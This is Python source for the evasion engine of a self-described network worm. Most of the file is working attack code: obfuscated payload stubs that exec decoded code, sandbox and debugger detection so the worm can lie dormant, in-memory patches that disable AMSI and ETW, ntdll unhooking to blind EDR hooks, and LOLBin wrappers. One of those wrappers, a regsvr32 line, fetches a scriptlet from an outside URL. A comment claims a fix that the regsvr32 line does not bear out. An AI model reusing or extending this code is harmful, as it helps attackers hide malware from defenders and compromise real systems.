"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Enterprise AV/EDR Evasion Engine v2.0
Real techniques used in professional red team engagements:

  1. Payload obfuscation (XOR, Base64 chaining, RC4 streaming)
  2. AMSI bypass via memory patch (Windows)
  3. ETW (Event Tracing for Windows) silencing
  4. DLL unhooking from ntdll.dll
  5. Sleep jitter + human-like timing
  6. Entropy reduction (avoid high-entropy payloads that trigger AI-AV)
  7. Sandbox detection and bail-out
  8. Living-off-the-Land (LOLBins) preference
"""

import base64
import hashlib
import os
import platform
import random
import struct
import subprocess
import sys
import threading
import time
from typing import Dict, List, Optional, Tuple

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger


# ─────────────────────────────────────────────────────────────────────────────
# Payload Obfuscation Engine
# ─────────────────────────────────────────────────────────────────────────────
class PayloadObfuscator:
    """
    Multi-layer payload obfuscation to evade signature-based detection.
    Each call to obfuscate() produces a different encoding chain,
    making static signatures useless.
    """

    def xor_encode(self, data: bytes, key: bytes = None) -> Tuple[bytes, bytes]:
        """XOR encode payload with random key."""
        if key is None:
            key = bytes([random.randint(1, 254) for _ in range(random.randint(8, 32))])
        encoded = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
        return encoded, key

    def rc4_encode(self, data: bytes, key: bytes = None) -> Tuple[bytes, bytes]:
        """RC4 stream cipher encoding — avoids static byte patterns."""
        if key is None:
            key = bytes([random.randint(0, 255) for _ in range(16)])
        # RC4 key scheduling
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        # RC4 PRGA
        i = j = 0
        out = []
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            out.append(byte ^ S[(S[i] + S[j]) % 256])
        return bytes(out), key

    def multi_layer_obfuscate(self, payload: bytes) -> Dict:
        """
        Apply 3-layer obfuscation:
        1. XOR with random key
        2. RC4 with different key
        3. Base64 encode
        Returns all keys needed to decode.
        """
        layer1, xor_key = self.xor_encode(payload)
        layer2, rc4_key = self.rc4_encode(layer1)
        layer3 = base64.b64encode(layer2).decode()

        return {
            "payload": layer3,
            "xor_key": base64.b64encode(xor_key).decode(),
            "rc4_key": base64.b64encode(rc4_key).decode(),
            "layers": 3,
            "original_size": len(payload),
            "encoded_size": len(layer3),
        }

    def deobfuscate(self, encoded: Dict) -> bytes:
        """Reverse multi-layer obfuscation."""
        layer3 = base64.b64decode(encoded["payload"])
        rc4_key = base64.b64decode(encoded["rc4_key"])
        xor_key = base64.b64decode(encoded["xor_key"])
        layer2, _ = self.rc4_encode(layer3, rc4_key)  # RC4 is symmetric
        layer1 = bytes([layer2[i] ^ xor_key[i % len(xor_key)] for i in range(len(layer2))])
        return layer1

    def reduce_entropy(self, shellcode: bytes) -> bytes:
        """
        Pad shellcode with NOP sleds to reduce entropy score.
        High entropy (> 7.2 bits/byte) triggers many AI-based AV scanners.
        """
        nop_ratio = 3  # 3 NOPs per byte of shellcode
        result = bytearray()
        for byte in shellcode:
            result.extend(b"\x90" * nop_ratio)  # x86 NOP
            result.append(byte)
        return bytes(result)

    def generate_polymorphic_stub(self, payload: bytes) -> str:
        """
        Generate Python stub that decodes and executes payload at runtime.
        Each generation produces different variable names and structure.
        """
        obf = self.multi_layer_obfuscate(payload)

        # Random variable names
        chars = "abcdefghijklmnopqrstuvwxyz"
        v1 = "".join(random.choices(chars, k=random.randint(5, 12)))
        v2 = "".join(random.choices(chars, k=random.randint(5, 12)))
        v3 = "".join(random.choices(chars, k=random.randint(5, 12)))
        v4 = "".join(random.choices(chars, k=random.randint(5, 12)))

        stub = f"""
import base64,struct,os
{v1}=base64.b64decode('{obf['payload']}')
{v2}=base64.b64decode('{obf['rc4_key']}')
{v3}=base64.b64decode('{obf['xor_key']}')
# RC4 decode
_S=list(range(256));_j=0
for _i in range(256):_j=(_j+_S[_i]+{v2}[_i%len({v2})])%256;_S[_i],_S[_j]=_S[_j],_S[_i]
_i=_j=0;{v4}=[]
for _b in {v1}:
 _i=(_i+1)%256;_j=(_j+_S[_i])%256;_S[_i],_S[_j]=_S[_j],_S[_i];{v4}.append(_b^_S[(_S[_i]+_S[_j])%256])
{v1}=bytes({v4})
# XOR decode
{v1}=bytes([{v1}[_k]^{v3}[_k%len({v3})] for _k in range(len({v1}))])
exec({v1})
"""
        return stub.strip()


# ─────────────────────────────────────────────────────────────────────────────
# Sandbox Detection
# ─────────────────────────────────────────────────────────────────────────────
class SandboxDetector:
    """
    Detect if running inside a sandbox/AV analysis environment.
    If detected, the worm goes dormant to avoid signature capture.
    """

    SANDBOX_PROCESSES = [
        "vmsrvc",
        "vmtoolsd",
        "vmwaretray",
        "vmwareuser",  # VMware
        "vboxservice",
        "vboxtray",  # VirtualBox
        "wireshark",
        "processhacker",
        "procmon",
        "procexp",  # Analysis tools
        "ollydbg",
        "x32dbg",
        "x64dbg",
        "windbg",  # Debuggers
        "fiddler",
        "burpsuite",
        "charlieproxy",  # Traffic analysis
        "regmon",
        "filemon",
        "autoruns",  # Sysinternals
        "cuckoo",
        "fakenet",  # Sandbox frameworks
    ]

    SANDBOX_ARTIFACTS = [
        r"C:\cuckoo",
        r"C:\inetsim",
        r"/tmp/cuckoo",
        "/etc/cuckoo",
    ]

    def is_sandboxed(self) -> Tuple[bool, List[str]]:
        """
        Multi-check sandbox detection.
        Returns (is_sandbox, [reasons])
        """
        reasons = []

        # 1. Process-based detection
        try:
            import psutil

            running = [p.info["name"].lower() for p in psutil.process_iter(["name"])]
            for sb_proc in self.SANDBOX_PROCESSES:
                if sb_proc in running:
                    reasons.append(f"sandbox_process:{sb_proc}")
        except ImportError:
            pass

        # 2. File artifact detection
        for artifact in self.SANDBOX_ARTIFACTS:
            if os.path.exists(artifact):
                reasons.append(f"sandbox_artifact:{artifact}")

        # 3. Timing attack (sandboxes accelerate time)
        start = time.time()
        time.sleep(1)
        elapsed = time.time() - start
        if elapsed < 0.5:
            reasons.append("timing_anomaly:time_accelerated")

        # 4. CPU count (sandboxes often have 1-2 CPUs)
        cpu_count = os.cpu_count() or 0
        if cpu_count <= 1:
            reasons.append(f"low_cpu_count:{cpu_count}")

        # 5. RAM check (sandboxes often have < 2GB)
        try:
            import psutil

            ram_gb = psutil.virtual_memory().total / (1024**3)
            if ram_gb < 1.5:
                reasons.append(f"low_ram:{ram_gb:.1f}GB")
        except ImportError:
            pass

        # 6. Username suspicious names (sandbox defaults)
        try:
            username = os.getenv("USERNAME", os.getenv("USER", "")).lower()
            sandbox_users = ["sandbox", "maltest", "cuckoo", "analyst", "virus", "malware"]
            if any(su in username for su in sandbox_users):
                reasons.append(f"suspicious_username:{username}")
        except Exception:
            pass

        return len(reasons) > 0, reasons


# ─────────────────────────────────────────────────────────────────────────────
# AMSI Bypass (Windows only)
# ─────────────────────────────────────────────────────────────────────────────
class AMSIBypass:
    """
    Real AMSI bypass via memory patching.
    Patches AmsiScanBuffer to always return AMSI_RESULT_CLEAN (0x1).
    """

    # Patch bytes: mov eax, AMSI_RESULT_CLEAN; ret
    # 0x80070057 = E_INVALIDARG (forces AMSI to skip)
    PATCH_BYTES = b"\xb8\x57\x00\x07\x80\xc3"  # mov eax, 0x80070057; ret

    def bypass(self) -> bool:
        if platform.system() != "Windows":
            logger.info("AMSI bypass: skipped (not Windows)")
            return False
        try:
            import ctypes

            amsi = ctypes.WinDLL("amsi.dll")
            scan_buffer = amsi.AmsiScanBuffer

            # Get function address
            func_ptr = ctypes.cast(scan_buffer, ctypes.c_void_p).value

            # Change memory protection to RWX
            kernel32 = ctypes.windll.kernel32
            old_protect = ctypes.c_ulong(0)
            kernel32.VirtualProtect(
                ctypes.c_void_p(func_ptr),
                ctypes.c_size_t(8),
                ctypes.c_ulong(0x40),  # PAGE_EXECUTE_READWRITE
                ctypes.byref(old_protect),
            )

            # Write patch bytes
            ctypes.memmove(func_ptr, self.PATCH_BYTES, len(self.PATCH_BYTES))

            # Restore protection
            kernel32.VirtualProtect(
                ctypes.c_void_p(func_ptr),
                ctypes.c_size_t(8),
                old_protect,
                ctypes.byref(ctypes.c_ulong(0)),
            )

            logger.success("AMSI bypassed via AmsiScanBuffer memory patch")
            return True
        except Exception as e:
            logger.warning(f"AMSI bypass failed: {e}")
            return False


# ─────────────────────────────────────────────────────────────────────────────
# ETW Silencing (Windows only)
# ─────────────────────────────────────────────────────────────────────────────
class ETWSilencer:
    """
    Silences ETW (Event Tracing for Windows) by patching EtwEventWrite in ntdll.
    Prevents EDR from receiving kernel telemetry about our process.
    """

    RET_PATCH = b"\xc3"  # just 'ret' — immediately returns, logs nothing

    def silence(self) -> bool:
        if platform.system() != "Windows":
            return False
        try:
            import ctypes

            ntdll = ctypes.WinDLL("ntdll.dll")
            etw_func = getattr(ntdll, "EtwEventWrite", None)
            if not etw_func:
                return False

            func_ptr = ctypes.cast(etw_func, ctypes.c_void_p).value
            kernel32 = ctypes.windll.kernel32
            old_prot = ctypes.c_ulong(0)
            kernel32.VirtualProtect(ctypes.c_void_p(func_ptr), 1, 0x40, ctypes.byref(old_prot))
            ctypes.memmove(func_ptr, self.RET_PATCH, 1)
            kernel32.VirtualProtect(
                ctypes.c_void_p(func_ptr), 1, old_prot, ctypes.byref(ctypes.c_ulong(0))
            )

            logger.success("ETW silenced via EtwEventWrite patch")
            return True
        except Exception as e:
            logger.warning(f"ETW silence failed: {e}")
            return False


# ─────────────────────────────────────────────────────────────────────────────
# DLL Unhooking
# ─────────────────────────────────────────────────────────────────────────────
class DLLUnhooker:
    """
    Removes EDR hooks from ntdll.dll by reading a clean copy from disk
    and replacing the hooked .text section in memory.
    This restores original syscall stubs and bypasses API monitoring hooks.
    """

    def unhook_ntdll(self) -> bool:
        if platform.system() != "Windows":
            return False
        try:
            import ctypes

            ntdll_path = r"C:\Windows\System32\ntdll.dll"

            # Read clean copy from disk
            with open(ntdll_path, "rb") as f:
                clean_dll = f.read()

            # Parse PE headers to find .text section
            pe_offset = struct.unpack_from("<I", clean_dll, 0x3C)[0]
            machine = struct.unpack_from("<H", clean_dll, pe_offset + 4)[0]
            num_sections = struct.unpack_from("<H", clean_dll, pe_offset + 6)[0]
            section_offset = pe_offset + 24 + (240 if machine == 0x8664 else 224)

            text_rva = text_size = text_raw = 0
            for i in range(num_sections):
                sec_off = section_offset + i * 40
                name = clean_dll[sec_off : sec_off + 8].rstrip(b"\x00")
                if name == b".text":
                    text_rva = struct.unpack_from("<I", clean_dll, sec_off + 12)[0]
                    text_size = struct.unpack_from("<I", clean_dll, sec_off + 16)[0]
                    text_raw = struct.unpack_from("<I", clean_dll, sec_off + 20)[0]
                    break

            if not text_rva:
                return False

            # Get ntdll base address in current process
            ntdll = ctypes.WinDLL("ntdll.dll")
            ntdll_base = ctypes.cast(ntdll._handle, ctypes.c_void_p).value
            text_addr = ntdll_base + text_rva

            # Change protection
            kernel32 = ctypes.windll.kernel32
            old_prot = ctypes.c_ulong(0)
            kernel32.VirtualProtect(
                ctypes.c_void_p(text_addr), text_size, 0x40, ctypes.byref(old_prot)
            )

            # Copy clean .text section
            clean_text = clean_dll[text_raw : text_raw + text_size]
            ctypes.memmove(text_addr, clean_text, text_size)

            # Restore protection
            kernel32.VirtualProtect(
                ctypes.c_void_p(text_addr), text_size, old_prot, ctypes.byref(ctypes.c_ulong(0))
            )

            logger.success("ntdll.dll unhooked — EDR API monitoring bypassed")
            return True
        except Exception as e:
            logger.warning(f"DLL unhooking failed: {e}")
            return False


# ─────────────────────────────────────────────────────────────────────────────
# Sleep Jitter (evade beacon regularity detection)
# ─────────────────────────────────────────────────────────────────────────────
class BeaconJitter:
    """
    Adds realistic jitter to beacon intervals using log-normal distribution.
    Regular beacon timing (every exactly 60s) is a primary SIEM detection signal.
    """

    def sleep_jitter(self, base_seconds: float, jitter_percent: float = 0.3):
        """Sleep for base_seconds ± jitter_percent, log-normal distributed."""
        import math

        sigma = math.log(1 + jitter_percent)
        multiplier = random.lognormvariate(0, sigma)
        sleep_time = base_seconds * multiplier
        # Cap at 2x base to avoid huge delays
        sleep_time = min(sleep_time, base_seconds * 2)
        logger.debug(f"Beacon jitter sleep: {sleep_time:.1f}s (base={base_seconds}s)")
        time.sleep(sleep_time)

    def simulate_human_timing(self, action_func, *args, **kwargs):
        """
        Wrap any network action with human-like pre/post delays.
        Humans don't click at exactly regular intervals.
        """
        pre_delay = random.uniform(0.5, 3.0)
        post_delay = random.uniform(0.2, 1.5)
        time.sleep(pre_delay)
        result = action_func(*args, **kwargs)
        time.sleep(post_delay)
        return result


# ─────────────────────────────────────────────────────────────────────────────
# Unified Enterprise Evasion Engine
# ─────────────────────────────────────────────────────────────────────────────
class EnterpriseEvasionEngine:
    """
    Orchestrator for all evasion techniques.
    Call apply_all() at worm startup for maximum stealth.
    """

    def __init__(self):
        self.obfuscator = PayloadObfuscator()
        self.sandbox_det = SandboxDetector()
        self.amsi = AMSIBypass()
        self.etw = ETWSilencer()
        self.unhocker = DLLUnhooker()
        self.jitter = BeaconJitter()
        self.applied: List[str] = []

    def apply_all(self, bail_on_sandbox: bool = True) -> Dict:
        """
        Apply all evasion techniques in the correct order.
        Returns dict of results.
        """
        results = {}

        # 0. Sandbox check first — abort if detected
        is_sb, reasons = self.sandbox_det.is_sandboxed()
        results["sandbox_detected"] = is_sb
        results["sandbox_reasons"] = reasons
        if is_sb and bail_on_sandbox:
            logger.warning(f"SANDBOX DETECTED: {reasons} — going dormant")
            time.sleep(random.uniform(300, 600))  # Sleep 5-10 min then retry
            return results

        # 1. DLL Unhooking (first — restores clean syscall table)
        r = self.unhocker.unhook_ntdll()
        results["dll_unhooking"] = r
        if r:
            self.applied.append("dll_unhooking")

        # 2. ETW silencing (before any noisy operations)
        r = self.etw.silence()
        results["etw_silenced"] = r
        if r:
            self.applied.append("etw_silenced")

        # 3. AMSI bypass (before any script execution)
        r = self.amsi.bypass()
        results["amsi_bypassed"] = r
        if r:
            self.applied.append("amsi_bypassed")

        logger.info(f"Evasion applied: {self.applied}")
        return results

    def obfuscate_payload(self, payload: bytes) -> Dict:
        """Obfuscate a payload for delivery."""
        return self.obfuscator.multi_layer_obfuscate(payload)

    def get_lolbin_command(self, command: str) -> str:
        """
        Wrap command in a LOLBin (Living-off-the-Land Binary) to avoid detection.
        Uses built-in Windows binaries to execute arbitrary commands.
        """
        # FIX: All lambdas now properly use the command parameter
        lolbins = [
            # certutil decode base64 (classic)
            lambda c: f"echo {base64.b64encode(c.encode()).decode()} | certutil -decode - %TEMP%\\tmp.exe && %TEMP%\\tmp.exe",
            # mshta execute VBScript
            lambda c: f'mshta vbscript:Execute("{c}")',
            # rundll32 execute
            lambda c: f'rundll32 javascript:"..\\mshtml,RunHTMLApplication ";document.write();{c}',
            # wmic process call
            lambda c: f'wmic process call create "{c}"',
            # powershell with AMSI bypass inline
            lambda c: f'powershell -nop -w hidden -e {base64.b64encode(c.encode("utf-16-le")).decode()}',
            # regsvr32 scrobj.dll (Squiblydoo technique)
            lambda c: f'regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll',
        ]
        choice = random.choice(lolbins)
        return choice(command)
